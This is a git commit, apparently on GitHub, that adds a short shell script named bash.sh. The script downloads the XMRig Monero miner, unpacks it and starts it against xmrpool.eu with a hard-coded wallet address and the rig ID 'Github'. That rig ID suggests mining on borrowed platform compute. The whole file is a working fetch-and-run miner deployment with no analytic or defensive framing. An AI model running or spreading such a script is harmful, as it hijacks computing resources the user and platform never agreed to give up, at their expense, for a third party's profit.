0e9c0b39830f1e307dc0c646ab8146f20e5a110d
KIM-SOFT <76026147+KIM-SOFT@users.noreply.github.com>
2022-04-30 16:32:45 +0000

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
+tar xvzf xmrig-6.16.4-linux-static-x64.tar.gz
+ls
+cd xmrig-6.16.4
+./xmrig -o xmrpool.eu:9999 -u 49fYvmBsirkT53ErUyJ59Qa4kxcs6xmq3RTXNvMfQdUSbbSzYRFu3rNPY2JLpgg1tzeqarroWgPUqLDKmn9t7vsr6U11gnG -k --tls --rig-id Github
